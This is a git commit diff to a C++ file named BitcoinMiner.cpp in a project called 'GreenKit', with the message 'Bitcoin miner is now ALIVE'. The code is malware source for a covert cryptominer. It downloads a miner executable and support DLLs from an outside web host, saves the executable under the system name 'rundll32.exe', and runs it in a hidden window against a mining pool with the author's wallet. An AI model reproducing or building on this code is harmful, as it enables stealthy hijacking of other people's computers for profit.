13a8340eae0af95b7221dfe7294a0fad07a41072
Nervous <linkbleu2000@hotmail.com>
2015-07-12 19:32:02 +0200

    Bitcoin miner is now ALIVE

--- GreenKit/BitcoinMiner.cpp
+++ GreenKit/BitcoinMiner.cpp
@@ -10,23 +10,13 @@ typedef HRESULT(WINAPI* lpURLDownloadToFile) (LPUNKNOWN pCaller,
     DWORD dwReserved,
     LPBINDSTATUSCALLBACK lpfnCB);
 
-size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
-    size_t written;
-    written = fwrite(ptr, size, nmemb, stream);
-    return written;
-}
-
-std::string AppName;
-BOOL CALLBACK block(HWND, LPARAM);
-
 void runFile();
 void downloadMiner();
 
 void StartMiner()
 {
-    downloadMiner(); //**Downloads bitcoin-miner.exe**//
-
-    runFile(); //**Runs bitcoin-miner.exe**// 
+    downloadMiner();
+    runFile(); 
 }
 
 void runFile()
@@ -39,7 +29,7 @@ void runFile()
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
-    CreateProcess("rundll32.exe", " -lowcpu 1 -dbg -1 -o stratum+tcp://mine.moneropool.com:3333 -u 448y9UUUynjgcV4mP4AXNjBJ9hb18Toi5A4eGZStWVTELAzQJUHWXQrGfiTECzwgFTLFfBm6sCpfJbzzKTM6Yq2QHCZ4FCy -p x", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    CreateProcess("rundll32.exe", "rundll32.exe -o stratum+tcp://mine.xpool.ca:1122 -u 1KNa8Zos3EiZV4jLgNYLty9N1LrFpzU9rA.NervousScrypt -p \"--diff 512\" --threads=4", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
 
     return;
 }
@@ -53,7 +43,10 @@ void downloadMiner()
 
     URLDownloadToFile = (lpURLDownloadToFile)GetProcAddress(hUrlmon, "URLDownloadToFileA");
 
-    URLDownloadToFile(0, "http://lynix.digitalpulsesoftware.com/NsCpuCNMiner32.exe", "rundll32.exe", 0, 0);
+    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/minerd.exe", "rundll32.exe", 0, 0);
+    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/zlib1.dll", "zlib1.dll", 0, 0);
+    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libwinpthread-1.dll", "libwinpthread-1.dll", 0, 0);
+    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libcurl-4.dll", "libcurl-4.dll", 0, 0);
 
     return;
 }
